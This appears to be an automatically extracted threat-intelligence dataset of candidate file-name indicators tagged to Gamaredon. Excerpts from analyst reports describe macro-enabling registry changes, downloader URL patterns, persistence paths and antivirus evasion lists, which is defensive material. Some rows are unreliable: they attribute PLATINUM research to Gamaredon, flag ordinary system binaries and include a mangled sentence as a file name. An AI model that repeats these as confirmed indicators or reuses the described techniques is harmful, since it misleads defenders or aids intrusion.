1.0.0,actor--gamaredon,artifact--sha256:b5d1837fbedb015db228c6d680d39d368f91fce9d08cf85c5df9f8d210534f29,observation--sha256:d9d70f12d3b85d560016b87c80fc24515d5c66e7f4962fdb6a5e7062a9f6252d,file-name,SEMBOYAN_1.doc,SEMBOYAN_1.doc,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 6. Malicious Word 2003 files used by PLATINUM to deliver CVE-2013-7331 Filename SHA1 URL for PNG Exploit Gerakan Anti SBY II.doc 1bdc1a0bc995c1beb363b11b71c14324be8577c9 mister.nofrillspace.com/users/web8_dice/4226/space.gif Tu_Vi_Nam_Tan_ Mao_2011.doc 2a33542038a85db4911d7b846573f6b251e16b2d intent.nofrillspace.com/users/web11_focus/3807/space.gif Wikileaks Indonesia.doc d6a795e839f51c1a5aeabf5c10664936ebbef8ea mister.nofrillspace.com/users/web8_dice/3791/space.gif Top 11 Aerial Surveill,
1.0.0,actor--gamaredon,artifact--sha256:0006ff1812542b502fd695fa325f63d5aa2688bdd8188e435388bbeecbdfc8c8,observation--sha256:d1c9a575db6de1f229c989e5295fd6a7547e64e9f53840b56046bbdca85808b7,file-name,Thearchivefiledownloadedinthisexampleisa7zipfilenamed56-27-11875.rar,Thearchivefiledownloadedinthisexampleisa7zipfilenamed56-27-11875.rar,candidate,,unknown,unknown,not-stated,,source--gamaredon--56ce9c37d34fb725,Gamaredon/BlueAlpha Abuses Cloudflare Tunneling Service for GammaDrop Staging Infrastructure.pdf,"{""page"": 7}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"CYBERTHREATANALYSIS Thearchivefiledownloadedinthisexampleisa7zipfilenamed56-27-11875.rar (a7zipfilewitha.rarextension). Oncedecompressed, asingledirectorynamed56-27-11875isextractedcontaininga.lnkfilenamedЗапит 56-27-11875 від 15.08.2024. Інформація з обмеженим доступому службовому листі відсутня. lnk, asshowninFigure7. ThefilenameroughlytranslatestoRequest 56-27-11875 dated August 15, 2024. There is no restricted accessinformation in the service letter.lnk. Figure7 Contentsofsmuggled7ziparchiv",
1.0.0,actor--gamaredon,artifact--sha256:0ad09e7868e35580bf79a30a8d7b01cd9376c97f12b66672f990006986363b6e,observation--sha256:fd6d2f62b32ae68d733c2f9c8cf661d8af587f35200582b3313b287e4fc3db93,file-name,WINWORD.EXE,WINWORD.EXE,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"23 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 First, PteroDoc enables programmatic access to VBA projects and enables all Word macros by setting the following registry values to 1: · HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ AccessVBOM · HKCU\Software\Microsoft \Office\<WordVersion> \Word\Security\ VBAWarnings The <WordVersion> is variable and dynamically resolved from the Word.Application VBScript object by PteroDoc during i",
1.0.0,actor--gamaredon,artifact--sha256:8e0cdacd4fb9d22a19e0566e44b63f77c9a35ce9c9e2cac24822e4eac9fc7f17,observation--sha256:5745bedc931c5cc0eaf02083f05c2b87747a725ad6e878320dd59b2213c0dc0f,file-name,account.php,account.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,11 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 URL leading to a PE file PowerShell command Encrypted VBScript PteroPSLoad time.php 13BA279D8602FEE7CEDE152B6A9148CD9D2F6662 ✓ ✓ PteroPSLoad slot.php B99D4724077B0A2CBEEE38332C05F3D4171C9DCC ✓ ✓ ✓ PteroPSLoad index.php 025E3D88C53FC12D5A4AAB726E696F2815BAC84D ✓ ✓ ✓ PteroPSLoad new.php D5576E578518E474A5DFF654C44AB3EC4A6E4ECF ✓ ✓ ✓ PteroPSLoad post.php E0BD8855159CB708789C4DE183E107C5C117FBA1 ✓ ✓ ✓ Pt,
1.0.0,actor--gamaredon,artifact--sha256:8e0cdacd4fb9d22a19e0566e44b63f77c9a35ce9c9e2cac24822e4eac9fc7f17,observation--sha256:ffe692228bc58c9f5006601b651f5e19014191f302ba8c41ec08bc97939d927a,file-name,account.php,account.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 This whole functionality was later removed from PteroPSLoad. account.php This version, in comparison to the previous one, contains two notable changes. The first in the persistence mechanism used, and the second in the way that it communicates with its C&C server. Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to %ALLUSERSPROFILE% and scheduling it to ",
1.0.0,actor--gamaredon,artifact--sha256:aec24e65eb459048fe82efcea48ba080b6c7e490964d7caad2ed20dd025d75aa,observation--sha256:2fe276e9fa04d86a20f7b65a4d737a532e4be175e0249aa8a17894b151d7cec0,file-name,api.php,api.php,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"20 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Third variant As described in our Gamaredon 2024 whitepaper, the third variant uses a downloader component , which we’ve now named PteroQuark. On February 10th, 2025, PteroQuark was updated with these key changes: • The tokens that it expects in downloaded base64 -encoded payloads changed from ?? to ))). • PteroQuark’s C&C config is stored in alternate data streams instead of in registry values. It uses randomly nam",
1.0.0,actor--gamaredon,artifact--sha256:0a7a46178e7a57df589bccbba8bd09ce78a7026d8b358becce8eccf957844d58,observation--sha256:ceeaa803337b89e88876efea1ef57fc2b1ef5365f5f704093d63cd5dc39f0898,file-name,archive.7z,archive.7z,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"40 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX A: HOST-BASED ARTIFACTS ASSOCIATED WITH PTEROPASTE Name Value Installation paths HKCU\EUDC\first HKCU\EUDC\knok HKCU\EUDC\runner HKCU\EUDC\usb Configuration paths HKCU\EUDC\privateKeyXml Filenames .lnk %PROCESSOR_REVISION% %PROCESSOR_REVISION%.ps1 volumeinfo.ps1 test.ps1 Mutexes Local \[0-9]{4}(0[1 -9]|1[1 -2]) Scheduled task names %PROCESSOR_IDENTIFIER% Scheduled task descriptions %PROCESSOR_IDENTIFIER% AP",
1.0.0,actor--gamaredon,artifact--sha256:16897eef6ccfd0fc9ec52e5025bcf337f841a3d0d9551d9d926d840b86f01c23,observation--sha256:7bcac95e255ae996eb60b99b3ce5c142a655a23df0acae344d7cccc267ca21d7,file-name,auth.php,auth.php,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 18}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,17 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Table 3. URL patterns as sociated with dedicated downloaders Associated URL patterns Downloader of PteroPShell http://<IP>/cmd http://<IP>/scripts/cmd.txt http://<IP>/test/cmd.txt Downloader of PteroBleed http://<IP>/scripts/web.txt http://<IP>/test/web.txt Downloader of PteroClone http://<IP>/test/copy.txt Downloader of PteroCookie http://<IP>/cookies http://<IP>/scripts/cookies.txt http://<IP>/admi,
1.0.0,actor--gamaredon,artifact--sha256:5fe1c22844c7f86983c3f2eab7ab26b4fb36178b7a8fb2e37365719984a83c77,observation--sha256:6e7e2f0675fd2b4af457b5a0cff4a1510cb932eaace952dba371121dd96c5330,file-name,avp.exe,avp.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:c6881d1f8e8ef166db2588fb979be76e62e53fc9034fe4774d603e069da32240,observation--sha256:10b977d4196f38bc013cd62ef23dde0ede90d78dadb2429d1b7a14f98b7fe3f1,file-name,bdagent.exe,bdagent.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:aee55e941c4fd8c30d65bd20dd48567b095b03a52f004cfd6c5102a7697aef27,observation--sha256:f34e7671a81b095cbf5cc45c0a0e2573a9e4e82ca2a1171c140edd8e572cf95f,file-name,blackd.exe,blackd.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:a7994d317494a44b221791272fed272f13b8b1f09087f85dd35678770989bb58,observation--sha256:86c7f21498ad03a5006f54236807d0d030fc1aa5c94e7c54d7e510c0a3557bd2,file-name,blackice.exe,blackice.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:03a4b7397253e3a838b905539a61ccd4dbc50365f7a4a22d0e839ea86290a23c,observation--sha256:f6e96bdc1c356e99d0f81abcd8eddba53f8d575d511ec2fe7a9eb1b0db222fd2,file-name,boot.ini,boot.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"19 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Improving LNK lures The second variant of PteroLNK creates three types of malicious LNK files, each designed to lure victims into executing them. Over the course of 2025, Gamaredon repeatedly refined how these LNK files were generated, focusing on naming strategies and file t argeting to maximize the likelihood of user interaction. Below is a summary of each type and its final state by the end of the year: 1. LNK fi",
1.0.0,actor--gamaredon,artifact--sha256:03a4b7397253e3a838b905539a61ccd4dbc50365f7a4a22d0e839ea86290a23c,observation--sha256:593845723de2313c8e0bb49cf9afa612806d52378adf1c25c5c396ba06745d7e,file-name,boot.ini,boot.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 41}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"41 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %TEMP% \1.exe APPENDIX C: HOST-BASED ARTIFACTS ASSOCIATED WITH THE SECOND VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %PUBLIC% \NTUSER.DAT.TMContainer00000000000000000001.regtrans -ms %PUBLIC% \NTUSER.DAT.TMContainer00000000000000000002.regtrans -ms %PUBLIC% \ntuser.ini:SRV %PUBLIC% \ntuser.ini:LNK %USERPROFILE% \boot.ini:SRV %USERPROFILE% \boot.ini:LNK %USERPROFILE% \boot.ini:G",
1.0.0,actor--gamaredon,artifact--sha256:03a4b7397253e3a838b905539a61ccd4dbc50365f7a4a22d0e839ea86290a23c,observation--sha256:acefd3226bc9d5df5a60ef2734f1960e61b1e5487a6b1d8c8e2316700645df50,file-name,boot.ini,boot.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 42}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"42 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Name Value %USERPROFILE% \boot.ini:URLTeletype %USERPROFILE% \boot.ini:WindowsDetect %USERPROFILE% \boot.ini:URLTelegra %USERPROFILE% \boot.ini:WindowsTelegra %USERPROFILE% \boot.ini:URL %USERPROFILE% \boot.ini:IP HKCU\Console \URL HKCU\Console \IP Registry values HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DXGIAdapterCache HKCU\Software \Microsoft \Windows \CurrentVersion \Run\DirectXDatabaseUpda ter HKC",
1.0.0,actor--gamaredon,artifact--sha256:e5e26713e8fb69bdd2ecb16e05cd01be7f1db2e6d667c40bfd949879b9714ff7,observation--sha256:f7acee5ef47e7751e4d0db11a1be74ae32ea31b5402095c31688282b0acbf9fe,file-name,cacls.exe,cacls.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"• Communicate via FTP. • Send email via SMTP. • Change permissions on files using the cacls.exe command-line utility. JPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things. Th",
1.0.0,actor--gamaredon,artifact--sha256:7ce14a7e22e0d33c6f0f8a80820ba0293b2bf48c830bbc0b33348f22a32a663d,observation--sha256:d6abacd4e86a78a9bf942c99fa657fefd9829d9a49732d33a99b47fe2b3470da,file-name,cloudflared.exe,cloudflared.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Surprisingly, the update mechanism was completely removed from this version of PteroPSLoad. Regarding the communication protocol, two significant changes were made. The first one is that a new method of obtaining the IP address of the C&C server was added. PteroPSLoad now leverages a DNS - over-HTTPS (DoH) service provided by Cloudflare. To get the IP address, it sends an HTTP GET request to https://",
1.0.0,actor--gamaredon,artifact--sha256:ef5e32fd4c07b3a059baf9fc92e0893ac037a04abbf7cdcd6c94480cbf280f95,observation--sha256:7c0afbbf5d06b570c4ae73c7c4ae6a0236fa86f5713d052eb32777b7345671ae,file-name,cmccore.exe,cmccore.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:abbf4c7d857a20142ae7afd46ad04c5509fab43ab6a8f8db482fe62f6a029f5b,observation--sha256:8db4822c8734a3a19410c622912fd25efaf85ecb07dad1af8d3df7f581b8b334,file-name,cmctrayicon.exe,cmctrayicon.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at l",
1.0.0,actor--gamaredon,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:a2c77e4326aedebe65e2efb83dceb40d15c1519e4aab7fe456f3c28e4338fa7e,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Figure 11. Sample configuration file for Win32/Dipsind.A Each Dipsind file contains an embedded encrypted configuration file that acts as a control for the backdoor. This configuration file also includes the initial command and control (C&C) location the Dipsind backdoor uses in addition to the pollcommandsite variable which references a URL where additional backup C&Cs can be polled. Configurable parameters include instructions on where Dipsind should install a copy of cmd.exe for spawning a re,
1.0.0,actor--gamaredon,artifact--sha256:0396d43f026f1c5ecf6af5f7d6a8b8bef3f5975fb665ec7926779a146be36a06,observation--sha256:ab24fd1a8bda8c3916b006f501b2ab3183b3ede6ebdc9fcfe5e69e8c73fa7574,file-name,cmd.exe,cmd.exe,candidate,,unknown,unknown,not-stated,2016-01-01T00:00:00Z,source--gamaredon--b32b75e3cedfdb37,Gamaredon/Platinum feature article - Targeted attacks in South and Southeast Asia April 2016.pdf,"{""page"": 17}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"• Communicate via FTP. • Send email via SMTP. • Change permissions on files using the cacls.exe command-line utility. JPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things. Th",
1.0.0,actor--gamaredon,artifact--sha256:86e3cb7a3f1a10b957651c9d373b30b1f43d225960ab940bc3c22c1786539ee0,observation--sha256:5201369586f8d2de3225e58761a8fc6ecf327d5389002bd66037b8f2537ac128,file-name,curl.exe,curl.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 Surprisingly, the update mechanism was completely removed from this version of PteroPSLoad. Regarding the communication protocol, two significant changes were made. The first one is that a new method of obtaining the IP address of the C&C server was added. PteroPSLoad now leverages a DNS - over-HTTPS (DoH) service provided by Cloudflare. To get the IP address, it sends an HTTP GET request to https://",
1.0.0,actor--gamaredon,artifact--sha256:86e3cb7a3f1a10b957651c9d373b30b1f43d225960ab940bc3c22c1786539ee0,observation--sha256:943c4fc5edd2defe05282c35e004a1ebd8bb47c7d16c55b63f6aaf73a6ff2cea,file-name,curl.exe,curl.exe,candidate,,unknown,unknown,not-stated,,source--gamaredon--0512c893b55f399d,Gamaredon/cyberespionage-gamaredon-way.pdf,"{""page"": 15}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 Cyberespionage the Gamaredon way: Analysis of toolset used to spy on Ukraine in 2022 and 2023 This whole functionality was later removed from PteroPSLoad. account.php This version, in comparison to the previous one, contains two notable changes. The first in the persistence mechanism used, and the second in the way that it communicates with its C&C server. Persistence is ensured by dropping a small PowerShell loader with a randomly generated filename to %ALLUSERSPROFILE% and scheduling it to ",
1.0.0,actor--gamaredon,artifact--sha256:86e3cb7a3f1a10b957651c9d373b30b1f43d225960ab940bc3c22c1786539ee0,observation--sha256:aec12eff1fe00aef79085e80802f925548c08306bfb7901486d1eb47a3070212,file-name,curl.exe,curl.exe,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"24 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Capabilities PteroPSDoor’s main goal is to search all mapped drives for files with specific extensions, and subsequently exfiltrate such files to C&C servers or cloud storage accounts operated by Gamaredon. On March 1st, 2025, PteroPSDoor received quite an interesting update , in which Gamaredon added several fallback methods – probably to overcome network -based blocking. First, Gamaredon added a fallback upload me",
1.0.0,actor--gamaredon,artifact--sha256:8944ab0d08ffa852b9b04f6584575ccbbcf538e5db61a42bd045f307cbc5fc10,observation--sha256:b8638d493dc8067cfc13716d721e71283089de71825d028adc485adbd1814ff5,file-name,desktop.dat,desktop.dat,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
1.0.0,actor--gamaredon,artifact--sha256:9b0b9091c29d0f3eccea95133e3e3f703da3ead0a7561ecc16e72643b19a2576,observation--sha256:4190a6822b3a11d07eec2427bda0fc40801269850e1b3a04ffb19e1c779e90c2,file-name,desktop.ini,desktop.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"20 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Third variant As described in our Gamaredon 2024 whitepaper, the third variant uses a downloader component , which we’ve now named PteroQuark. On February 10th, 2025, PteroQuark was updated with these key changes: • The tokens that it expects in downloaded base64 -encoded payloads changed from ?? to ))). • PteroQuark’s C&C config is stored in alternate data streams instead of in registry values. It uses randomly nam",
1.0.0,actor--gamaredon,artifact--sha256:9b0b9091c29d0f3eccea95133e3e3f703da3ead0a7561ecc16e72643b19a2576,observation--sha256:b2444615ae9641990e68c89afbe60fd5b3670e08ff3387570a54babc1d498164,file-name,desktop.ini,desktop.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
1.0.0,actor--gamaredon,artifact--sha256:636f103868f52ce0a31b0f608bec8f50817f84931ff5229a6e02e8e998fb272e,observation--sha256:1e3cee48ff9678ecb6287d4358677070e18796d605ecbccb60707b0c6cf30dcd,file-name,desktop.sys,desktop.sys,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
1.0.0,actor--gamaredon,artifact--sha256:3c906e845a79b9ad1e70ff3857bf5dd894091df1cb70a05a79ccfae873ef0cdd,observation--sha256:75b9c787ab6f478d6f51ac0a79b429ad041662bb210e906b4cd20abfc8c5aff3,file-name,desktopc.ini,desktopc.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"20 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances Third variant As described in our Gamaredon 2024 whitepaper, the third variant uses a downloader component , which we’ve now named PteroQuark. On February 10th, 2025, PteroQuark was updated with these key changes: • The tokens that it expects in downloaded base64 -encoded payloads changed from ?? to ))). • PteroQuark’s C&C config is stored in alternate data streams instead of in registry values. It uses randomly nam",
1.0.0,actor--gamaredon,artifact--sha256:3c906e845a79b9ad1e70ff3857bf5dd894091df1cb70a05a79ccfae873ef0cdd,observation--sha256:a73c76c8a1b5af7dc7ec0f493f63ca7fc42ca93bec5aa52d284989a276a1c4fb,file-name,desktopc.ini,desktopc.ini,candidate,,unknown,unknown,not-stated,2025-01-01T00:00:00Z,source--gamaredon--daa9dc266e370995,Gamaredon/gamaredon-in-2025.pdf,"{""page"": 43}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"43 Gamaredon in 2025: Leveraging tunnels, workers, dead drops, and new alliances APPENDIX D: HOST-BASED ARTIFACTS ASSOCIATED WITH THE THIRD VARIANT OF THE PTEROLNK VBSCRIPT VERSION Name Value Installation paths %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktops.ini %APPDATA% \{WindowsPowerShell|Windows|VirtualStore|MSBuild|cache|Micros oft|Internet|Microsoft.NET|Defender|CrashDumps }\desktop.dat %APPDATA% \{Logs|WinRA",
